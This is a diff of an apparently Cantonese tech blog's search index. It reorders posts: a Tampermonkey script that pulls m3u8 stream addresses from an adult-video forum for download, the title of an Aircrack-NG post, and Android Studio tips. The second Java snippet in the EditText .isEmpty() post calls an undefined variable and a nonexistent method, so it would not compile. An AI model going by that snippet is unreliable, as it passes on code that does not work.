@@ -54,19 +54,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Tempermonkey - 取得 5278 影片 m3u8 位置</title>
-    <url>/2022/01/09/5278-display-m3u8-location/</url>
-    <content><![CDATA[<h1 id="link"><a href="#link" class="headerlink" title="link"></a>link</h1><p><a href="https://greasyfork.org/en/scripts/396711-5278-display-m3u8-address">https://greasyfork.org/en/scripts/396711-5278-display-m3u8-address</a></p>
-<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name        5278 display m3u8 address</span></span><br><span class="line"><span class="comment">// @name:zh-CN        5278 display m3u8 address</span></span><br><span class="line"><span class="comment">// @namespace:zh-TW   5278_display_m3u8_address</span></span><br><span class="line"><span class="comment">// @supportURL  https://github.com/zhuzemin</span></span><br><span class="line"><span class="comment">// @description 5278 show m3u8 address</span></span><br><span class="line"><span class="comment">// @description:zh-CN 5278 show m3u8 address</span></span><br><span class="line"><span class="comment">// @description:zh-TW 5278 show m3u8 address</span></span><br><span class="line"><span class="comment">// @include     https://5278.cc/thread-*-1-1.html</span></span><br><span class="line"><span class="comment">// @include     https://hbo6.hboav.com/v4/public/Player.php?*</span></span><br><span class="line"><span class="comment">// @version     1.03</span></span><br><span class="line"><span class="comment">// @run-at      document-end</span></span><br><span class="line"><span class="comment">// @author      zhuzemin</span></span><br><span class="line"><span class="comment">// @license     Mozilla Public License 2.0; http://www.mozilla.org/MPL/2.0/</span></span><br><span class="line"><span class="comment">// @license     CC Attribution-ShareAlike 4.0 International; http://creativecommons.org/licenses/by-sa/4.0/</span></span><br><span class="line"><span class="comment">// @grant         GM_registerMenuCommand</span></span><br><span class="line"><span class="comment">// @grant         GM_setValue</span></span><br><span class="line"><span class="comment">// @grant         GM_getValue</span></span><br><span class="line"><span class="comment">// @namespace https://greasyfork.org/users/400918</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"><span class="keyword">let</span> config = &#123;</span><br><span class="line">  <span class="string">&#x27;debug&#x27;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&#x27;version&#x27;</span>: GM_getValue(<span class="string">&#x27;version&#x27;</span>) || <span class="string">&#x27;2.9.3&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> debug = config.debug ? <span class="built_in">console</span>.log.bind(<span class="built_in">console</span>) : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// prepare UserPrefs</span></span><br><span class="line">setUserPref(</span><br><span class="line">  <span class="string">&#x27;version&#x27;</span>,</span><br><span class="line">  config.version,</span><br><span class="line">  <span class="string">&#x27;Set N_m3u8DL version&#x27;</span>,</span><br><span class="line">  <span class="string">`Set N_m3u8DL version`</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">let</span> init = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.self === <span class="built_in">window</span>.top) &#123;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">    input.setAttribute(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;text&quot;</span>);</span><br><span class="line">    input.size = <span class="built_in">window</span>.screen.width;</span><br><span class="line">    <span class="built_in">document</span>.body.insertBefore(input, <span class="built_in">document</span>.body.firstChild);</span><br><span class="line">    <span class="keyword">let</span> N_m3u8DL = <span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">    N_m3u8DL.setAttribute(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;text&quot;</span>);</span><br><span class="line">    N_m3u8DL.size = <span class="built_in">window</span>.screen.width;</span><br><span class="line">    <span class="built_in">document</span>.body.insertBefore(N_m3u8DL, <span class="built_in">document</span>.body.firstChild);</span><br><span class="line">    <span class="keyword">let</span> title = <span class="built_in">document</span>.title.replace(<span class="string">&#x27; - 成人線上直播一區 - 5278 / 5278論壇 / 我愛78論壇&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> iframe = <span class="built_in">document</span>.querySelector(<span class="string">&quot;iframe.cc5278_player&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> src = iframe.getAttribute(<span class="string">&quot;src&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> hostname = getLocation(src).hostname;</span><br><span class="line">    debug(hostname);</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (e.data.includes(<span class="string">&#x27;hboav.com&#x27;</span>)) &#123;</span><br><span class="line">        debug(e.data);</span><br><span class="line">        N_m3u8DL.setAttribute(<span class="string">&quot;value&quot;</span>, <span class="string">&#x27;N_m3u8DL-CLI_v&#x27;</span> + config.version + <span class="string">&#x27; &quot;&#x27;</span> + e.data + <span class="string">&#x27;&quot; --headers &quot;Referer:&#x27;</span> + src + <span class="string">&#x27;&quot;  --saveName &quot;&#x27;</span> + title + <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        input.setAttribute(<span class="string">&quot;value&quot;</span>, e.data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> video = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> interval = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> script = video.querySelector(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (script) &#123;</span><br><span class="line">        <span class="comment">//debug(script.innerHTML);</span></span><br><span class="line">        <span class="comment">//let url = script.innerHTML.match(/ /)[1];</span></span><br><span class="line">        <span class="keyword">let</span> url = unsafeWindow.player.src();</span><br><span class="line">        debug(url);</span><br><span class="line">        <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;parent.postMessage(url, <span class="string">&quot;*&quot;</span>);&#125;,<span class="number">4000</span>);</span><br><span class="line">        <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, init);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a user setting prompt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">varName</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;any&#125;</span> <span class="variable">defaultVal</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">menuText</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">promtText</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;function&#125;</span> <span class="variable">func</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUserPref</span>(<span class="params">varName, defaultVal, menuText, promtText, func = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">  GM_registerMenuCommand(menuText, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = prompt(promtText, GM_getValue(varName, defaultVal));</span><br><span class="line">    <span class="keyword">if</span> (val === <span class="literal">null</span>) &#123; <span class="keyword">return</span>; &#125;  <span class="comment">// end execution if clicked CANCEL</span></span><br><span class="line">    GM_setValue(varName, val);</span><br><span class="line">    <span class="keyword">if</span> (func != <span class="literal">null</span>) &#123;</span><br><span class="line">      func(val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocation</span>(<span class="params">href</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> l = <span class="built_in">document</span>.createElement(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">  l.href = href;</span><br><span class="line">  <span class="keyword">return</span> l;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>Javascript</tag>
-        <tag>Tampermonkey</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Aircrack-NG - 完整的評估 WiFi 網絡安全的工具</title>
     <url>/2021/12/11/Aircrack-NG-commands/</url>
     <content><![CDATA[<img src ="cover.svg" width="300px" hegiht="300px"/>
@@ -144,6 +131,19 @@
       </tags>
   </entry>
   <entry>
+    <title>Tempermonkey - 取得 5278 影片 m3u8 位置</title>
+    <url>/2022/01/09/5278-display-m3u8-location/</url>
+    <content><![CDATA[<h1 id="link"><a href="#link" class="headerlink" title="link"></a>link</h1><p><a href="https://greasyfork.org/en/scripts/396711-5278-display-m3u8-address">https://greasyfork.org/en/scripts/396711-5278-display-m3u8-address</a></p>
+<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name        5278 display m3u8 address</span></span><br><span class="line"><span class="comment">// @name:zh-CN        5278 display m3u8 address</span></span><br><span class="line"><span class="comment">// @namespace:zh-TW   5278_display_m3u8_address</span></span><br><span class="line"><span class="comment">// @supportURL  https://github.com/zhuzemin</span></span><br><span class="line"><span class="comment">// @description 5278 show m3u8 address</span></span><br><span class="line"><span class="comment">// @description:zh-CN 5278 show m3u8 address</span></span><br><span class="line"><span class="comment">// @description:zh-TW 5278 show m3u8 address</span></span><br><span class="line"><span class="comment">// @include     https://5278.cc/thread-*-1-1.html</span></span><br><span class="line"><span class="comment">// @include     https://hbo6.hboav.com/v4/public/Player.php?*</span></span><br><span class="line"><span class="comment">// @version     1.03</span></span><br><span class="line"><span class="comment">// @run-at      document-end</span></span><br><span class="line"><span class="comment">// @author      zhuzemin</span></span><br><span class="line"><span class="comment">// @license     Mozilla Public License 2.0; http://www.mozilla.org/MPL/2.0/</span></span><br><span class="line"><span class="comment">// @license     CC Attribution-ShareAlike 4.0 International; http://creativecommons.org/licenses/by-sa/4.0/</span></span><br><span class="line"><span class="comment">// @grant         GM_registerMenuCommand</span></span><br><span class="line"><span class="comment">// @grant         GM_setValue</span></span><br><span class="line"><span class="comment">// @grant         GM_getValue</span></span><br><span class="line"><span class="comment">// @namespace https://greasyfork.org/users/400918</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"><span class="keyword">let</span> config = &#123;</span><br><span class="line">  <span class="string">&#x27;debug&#x27;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&#x27;version&#x27;</span>: GM_getValue(<span class="string">&#x27;version&#x27;</span>) || <span class="string">&#x27;2.9.3&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> debug = config.debug ? <span class="built_in">console</span>.log.bind(<span class="built_in">console</span>) : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// prepare UserPrefs</span></span><br><span class="line">setUserPref(</span><br><span class="line">  <span class="string">&#x27;version&#x27;</span>,</span><br><span class="line">  config.version,</span><br><span class="line">  <span class="string">&#x27;Set N_m3u8DL version&#x27;</span>,</span><br><span class="line">  <span class="string">`Set N_m3u8DL version`</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">let</span> init = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.self === <span class="built_in">window</span>.top) &#123;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">    input.setAttribute(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;text&quot;</span>);</span><br><span class="line">    input.size = <span class="built_in">window</span>.screen.width;</span><br><span class="line">    <span class="built_in">document</span>.body.insertBefore(input, <span class="built_in">document</span>.body.firstChild);</span><br><span class="line">    <span class="keyword">let</span> N_m3u8DL = <span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">    N_m3u8DL.setAttribute(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;text&quot;</span>);</span><br><span class="line">    N_m3u8DL.size = <span class="built_in">window</span>.screen.width;</span><br><span class="line">    <span class="built_in">document</span>.body.insertBefore(N_m3u8DL, <span class="built_in">document</span>.body.firstChild);</span><br><span class="line">    <span class="keyword">let</span> title = <span class="built_in">document</span>.title.replace(<span class="string">&#x27; - 成人線上直播一區 - 5278 / 5278論壇 / 我愛78論壇&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> iframe = <span class="built_in">document</span>.querySelector(<span class="string">&quot;iframe.cc5278_player&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> src = iframe.getAttribute(<span class="string">&quot;src&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> hostname = getLocation(src).hostname;</span><br><span class="line">    debug(hostname);</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (e.data.includes(<span class="string">&#x27;hboav.com&#x27;</span>)) &#123;</span><br><span class="line">        debug(e.data);</span><br><span class="line">        N_m3u8DL.setAttribute(<span class="string">&quot;value&quot;</span>, <span class="string">&#x27;N_m3u8DL-CLI_v&#x27;</span> + config.version + <span class="string">&#x27; &quot;&#x27;</span> + e.data + <span class="string">&#x27;&quot; --headers &quot;Referer:&#x27;</span> + src + <span class="string">&#x27;&quot;  --saveName &quot;&#x27;</span> + title + <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        input.setAttribute(<span class="string">&quot;value&quot;</span>, e.data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> video = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> interval = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> script = video.querySelector(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (script) &#123;</span><br><span class="line">        <span class="comment">//debug(script.innerHTML);</span></span><br><span class="line">        <span class="comment">//let url = script.innerHTML.match(/ /)[1];</span></span><br><span class="line">        <span class="keyword">let</span> url = unsafeWindow.player.src();</span><br><span class="line">        debug(url);</span><br><span class="line">        <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;parent.postMessage(url, <span class="string">&quot;*&quot;</span>);&#125;,<span class="number">4000</span>);</span><br><span class="line">        <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, init);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a user setting prompt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">varName</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;any&#125;</span> <span class="variable">defaultVal</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">menuText</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">promtText</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;function&#125;</span> <span class="variable">func</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUserPref</span>(<span class="params">varName, defaultVal, menuText, promtText, func = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">  GM_registerMenuCommand(menuText, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = prompt(promtText, GM_getValue(varName, defaultVal));</span><br><span class="line">    <span class="keyword">if</span> (val === <span class="literal">null</span>) &#123; <span class="keyword">return</span>; &#125;  <span class="comment">// end execution if clicked CANCEL</span></span><br><span class="line">    GM_setValue(varName, val);</span><br><span class="line">    <span class="keyword">if</span> (func != <span class="literal">null</span>) &#123;</span><br><span class="line">      func(val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocation</span>(<span class="params">href</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> l = <span class="built_in">document</span>.createElement(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">  l.href = href;</span><br><span class="line">  <span class="keyword">return</span> l;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>Javascript</tag>
+        <tag>Tampermonkey</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Android Studio - Failed to apply plugin &#39;com.android.internal.application&#39;</title>
     <url>/2022/02/22/Android-Studio-Caused-by-org-gradle-api-internal-plugins-PluginApplicationException-Failed-to-apply-plugin-com-android-internal-application/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你改 folder 名既時候，再入發現佢出現 Error</p>
@@ -204,6 +204,20 @@
       </tags>
   </entry>
   <entry>
+    <title>Android Studio - Preview 顯示 System UI</title>
+    <url>/2022/01/26/Android-Studio-Show-System-UI/</url>
+    <content><![CDATA[<h1 id="進入"><a href="#進入" class="headerlink" title="進入"></a>進入</h1><p>去返你 <code>UI</code> 個位，搵個眼既公仔圖示，<br>撳一下再撳 <code>Show System UI</code>.</p>
+<h1 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h1><img src="/2022/01/26/Android-Studio-Show-System-UI/ui.gif" class="">
+
+<center><h1 style="font-size:10rem">搞撚掂。</h1></center>]]></content>
+      <categories>
+        <category>Android Studio</category>
+      </categories>
+      <tags>
+        <tag>Apps</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Android Studio - 插件上安裝另外的 Themes</title>
     <url>/2022/01/12/Android-Studio-Install-plugin-themes/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>覺唔覺 Android Studio 原本既 Themes 睇落真係好唔順眼？<br>如果你同我一樣係咁諗，咁你就一定要學識點樣裝一個新 Theme 喺 Android Studio 入面啦！</p>
@@ -248,20 +262,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Android Studio - Preview 顯示 System UI</title>
-    <url>/2022/01/26/Android-Studio-Show-System-UI/</url>
-    <content><![CDATA[<h1 id="進入"><a href="#進入" class="headerlink" title="進入"></a>進入</h1><p>去返你 <code>UI</code> 個位，搵個眼既公仔圖示，<br>撳一下再撳 <code>Show System UI</code>.</p>
-<h1 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h1><img src="/2022/01/26/Android-Studio-Show-System-UI/ui.gif" class="">
-
-<center><h1 style="font-size:10rem">搞撚掂。</h1></center>]]></content>
-      <categories>
-        <category>Android Studio</category>
-      </categories>
-      <tags>
-        <tag>Apps</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Android Studio - VCS root configuration problems</title>
     <url>/2022/02/22/Android-Studio-VCS-root-configuration-problems/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你 download 人地既 Project 既時候，<br>出現 Error</p>
@@ -275,6 +275,26 @@
         <category>Android Studio</category>
       </categories>
       <tags>
+        <tag>Apps</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android Studio - .isEmpty() | 檢查 EditText 入面係咪冇打野</title>
+    <url>/2022/02/17/Android-Studio-check-boolean-text-empty/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你好似平時咁 <code>if input == &quot;&quot;</code>，<br>咁會出現一個問題，<br>就係當用戶打 <code>&quot; &quot;</code><br>入面係佢打空白鍵，<br>咁既時候佢都會當你唔係冇打野，<br>要解決呢個問題有好多方法<br>而今篇，會講用 <code>.isEmpty()</code> 判斷 EditText 入面係冇打野，</p>
+<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fab fa-android"></i> .isEmpty() Version1 (建議方法)</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fab fa-android"></i> .isEmpty() Version2 (自己開 function)</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn_con</span><span class="params">(View v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        EditText textbox_nameinput = (EditText) findViewById(R.id.textbox_nameinput);</span><br><span class="line"></span><br><span class="line">        String textbox1 = textbox_nameinput.getText().toString().trim();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (textbox1.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            textbox_nameinput.setError(<span class="string">&quot;你未打野入黎。&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn_con</span><span class="params">(View v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        EditText textbox_nameinput = (EditText) findViewById(R.id.textbox_nameinput);</span><br><span class="line">        String ourEditTextString = editText.getText().toString();</span><br><span class="line">        String ourEditTextNoSpaces = ourEditTextString.replaceAll(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isOurEditTextEmpty = ourEditTextNoSpaces.isEmpty();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (textbox1.isOurEditTextEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            textbox_nameinput.setError(<span class="string">&quot;你未打野入黎。&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>拎 EditText 入面既料<br>然後再用 <code>.isEmpty()</code> 呢個 function<br>當如果呢舊野入面係冇打既野時候，<br>條件就會成立，<br>然後就判斷為冇打到野。</p>
+<p>而 else 就係相反，<br>你有打到野。</p>
+<p>基本上所有字都計，<br>除左你撳 <code>空白鍵</code> 唔計。</p>
+<p>分別大同小異。</p>
+<p>參考資料<br><a href="https://stackoverflow.com/questions/20349522/android-check-if-edittext-is-empty-when-inputtype-is-set-on-number-phone/55621072">https://stackoverflow.com/questions/20349522/android-check-if-edittext-is-empty-when-inputtype-is-set-on-number-phone/55621072</a></p>
+]]></content>
+      <categories>
+        <category>Android Studio</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
         <tag>Apps</tag>
       </tags>
   </entry>
@@ -310,26 +330,6 @@
         <tag>Java</tag>
         <tag>Apps</tag>
         <tag>安裝</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android Studio - .isEmpty() | 檢查 EditText 入面係咪冇打野</title>
-    <url>/2022/02/17/Android-Studio-check-boolean-text-empty/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你好似平時咁 <code>if input == &quot;&quot;</code>，<br>咁會出現一個問題，<br>就係當用戶打 <code>&quot; &quot;</code><br>入面係佢打空白鍵，<br>咁既時候佢都會當你唔係冇打野，<br>要解決呢個問題有好多方法<br>而今篇，會講用 <code>.isEmpty()</code> 判斷 EditText 入面係冇打野，</p>
-<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fab fa-android"></i> .isEmpty() Version1 (建議方法)</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fab fa-android"></i> .isEmpty() Version2 (自己開 function)</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn_con</span><span class="params">(View v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        EditText textbox_nameinput = (EditText) findViewById(R.id.textbox_nameinput);</span><br><span class="line"></span><br><span class="line">        String textbox1 = textbox_nameinput.getText().toString().trim();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (textbox1.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            textbox_nameinput.setError(<span class="string">&quot;你未打野入黎。&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 